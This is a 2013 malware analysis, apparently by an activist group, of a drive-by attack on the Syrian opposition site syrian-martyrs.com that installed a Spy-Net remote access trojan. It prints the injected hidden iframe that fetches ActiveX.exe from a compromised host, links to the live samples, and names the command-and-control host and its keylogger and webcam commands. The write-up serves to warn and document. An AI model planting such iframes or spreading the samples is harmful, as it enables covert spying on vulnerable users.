[[!tag syria malware rat]]

**Warning**: the website _syrian-martyrs.com_ was infected by a spyware that could install itself on your Windows machine without you being aware of it. Although the website now seems clean, the vulnerabilities that allowed an attacker to plant the malicious code and associated malware may still be present, and the phenomenon might happen again. Be careful.

Between 28th and 30th January 2013, website _syrian-martyrs.com_ contained malicious HTML code aiming at downloading to the visitor's machine a Windows malware, which aims at spying on people's activity on their computer (kudos to velenere for spreading the news).

It has been on [syrianmalware.com](http://syrianmalware.com) since 31st January. It has the following characteristics:

    Filename: ActiveX.exe
    MD5 hash: 185c8d11c0611cae7c81f4458bf1adea
    SHA256 hash: cfdd3a78a895b3f49a39402eb28b0d2134cc3086849a41a6fdfe7d829a0d4dcd

A copy of it is available [here (**INFECTED LINK**)](https://resources.telecomix.ceops.eu/material/malwares/syrian-martyrs/ActiveX.exe).

Feel free to [get in touch](https://id.ceops.eu/kheops/) with me if you see any inaccuracy or missing information in this page. Most of the article was written while the website was still infected, explaining the use of present tense.

[[!toc levels=2]]

# Infection vector

Most pages on _syrian-martyrs.com_ contain malicious HTML code aiming at making the user download the executable file. The code is at the very end of pages' HTML code. The malicious code is the following:

    <p align="center">
    <iframe name="I1" width="10" height="10" src="http://acadcisco.unisla.pt/downloads/uploads/software/ActiveX.exe" border="0" frameborder="0">
    ?C ?I?? C???E??? C??? E?EII?? C???C?CE C?????E ?? E?E E???E? ?C??C? ?E? ?C ?I?? C???C?CE C?????E.
    </iframe></p>

With that iFrame, it asks the user's browser to download the file _ActiveX.exe_ hosted on _acadcisco.unisla.pt_. On some Windows browsers (Internet Explorer?), it might even execute the file automatically without warning.

It impacts (at least) all pages served by the _index.php_ script in the _/ar/_ directory, and the code always appear at the very bottom. This leads to think that the _index.php_ in that directory has been changed by an attacker to send that code after any dynamic content. It impacts the index file at the website's root as well.

Examples of infected URLs:

    http://www.syrian-martyrs.com/ar/index.php?option=com_content&view=article&id=15956:2013-01-28-17-04-23&catid=4:activest-martyrs&Itemid=2
    http://www.syrian-martyrs.com/

In short, **the website has probably been penetrated by an attacker who changed its content**. The attacker used either a Joomla vulnerability or another vulnerability on the server, which has many open ports. Admins should cleanup their website, identify how they have been infected and close vulnerabilities.

# Malware analysis

The malware is [detected by most anti-virus software](https://www.virustotal.com/file/cfdd3a78a895b3f49a39402eb28b0d2134cc3086849a41a6fdfe7d829a0d4dcd/analysis/1359494219/), and has apparently been known since Octobre 2010.

## Contact with the attacker's Command & Control server

This malware keeps trying to connect to host _awrasx10.no-ip.biz_ on TCP port 9999, which is probably the Command & Control from where it can either receive orders on what to do to the victim's computer. This hostname at the moment of first writing this article resolved to 37.236.124.197, which is an Iraqi IP address for DSL broadband access:

    inetnum:        37.236.0.0 - 37.237.255.255
    netname:        BROADBAND-SUBSCRIBERS-POOL
    descr:          EarthLink Ltd. Communications&Internet Services-Orange
    country:        IQ

This IP address did not respond when trying to check for the C&C presence. The attacker was probably offline.

## Evidence of spying on user's activity

On 30th January evening, _awrasx10.no-ip.biz_ resolved to another Iraqi broadband IP, 37.236.49.47, meaning that the attacker came online again from a DSL connection and updated the DNS record to receive connections from infected machines. Running the malware in a Windows XP virtual machine showed evidence of its communications with the C&C, which have been recorded by Wireshark and are [available here](https://resources.telecomix.ceops.eu/material/malwares/syrian-martyrs/2013-01-30_trafficcapture.pcap) (thanks Pheimors).

In the capture, the dialogue between the infected machine and the C&C starts by an exchange of binary data: probably an initialization phase.

Then, we can see that the C&C emits periodic "ping" requests with this string:

    ping|

The malware responds by sending a "pong", plus the name of the currently active window on the user's desktop:

    pong|Capturing from AMD PCNET Family Ethernet Adapter (Microsoft's Packet Scheduler) : \Device\NPF_{AD28DC2A-723E-4842-839D-603D9B531D7E}    [Wireshark 1.8.2  (SVN Rev 44520 from /trunk-1.8)]###30854|

The C&C also appeared to send a more specific command:

    ping|imgdesk|

It was followed by a binary response from the malware, which could be a screenshot of the user's desktop.

This confirms the malware is meant for spying on users' activity on their computer.

When connecting to the C&C using telnet and sending random data, the C&C replies with the following line:

    tentarnovamente|

which means "try again" in Portuguese.

## Detailed content of the malware executable file

The file contains other executables and libraries:

- _2.exe_, which is unpacked upon first execution and executed on the victim's system;
- a library hidden in _2.exe_, which we will call _XX.exe_, that seems to contain the actual implementation of the malicious code, which is probably called from _2.exe_.

[y0ug](https://twitter.com/y0ug) gave [details on how the files are packaged and where the malicious code is located](https://resources.telecomix.ceops.eu/material/malwares/syrian-martyrs/2013-01-30_first_analysis.txt) by taking a look at strings that appear in the executable files.

[Here](https://resources.telecomix.ceops.eu/material/malwares/syrian-martyrs/malware.zip) is a ZIP archive (password: _infected_) containing the initial file, _2.exe_ and _XX.exe_.

_XX.exe_ is detected as a [Remote Administration Tool](https://en.wikipedia.org/wiki/Remote_Administration_Tool) (RAT) by some anti-virus software, used to remotely observe activity on a computer, virtually **giving the attacker full access to the victim's computer**. It contains strings like _Spy-Net_ (uncompress it with _upx -d XX.exe_ first).

The following command gives an idea of the spying ability of the malware:

    strings XX.exe | grep '|'

It reveals in particular the commands that the C&C can send to the spyware or vice-versa, like for example:

    keylogger|keylogger|keyloggerativar|
    keylogger|keylogger|keyloggerdesativar|
    webcam|webcaminactive|
    webcam|webcamactive|
    registro|renamekey|
    filemanager|listardrives|

This and many other strings in this same file basically show that the spyware aims at giving the C&C the ability to obtain what the victim types on keyboard, to interact with the webcam, the Windows registry, to explore the victim's hard disks content, etc.

# Who? Why?

The fact that _syrian-martyrs.com_ has been infected in particular can make us think that the action comes from pro-regime people aiming at targetting opponents. The fact that the C&C is based in Iraq can also be seen as a link with the Syrian situation. An _nmap_ scan was run while the C&C while online, its results can be found [here](https://resources.telecomix.ceops.eu/material/malwares/syrian-martyrs/2013-02-02_nmap-CC.txt).

It can also be the result of a non-targeted attack, i.e. someone performing automated scans of well-known vulnerability issues and subsequently infecting the website, in order to trap as many people as possible.

Another interrogation is why the malware is hosted on the Portuguese host _acadcisco.unisla.pt_, which appears to be a corporate website. Note that that there is Portuguese language inside the communication protocol of the C&C.
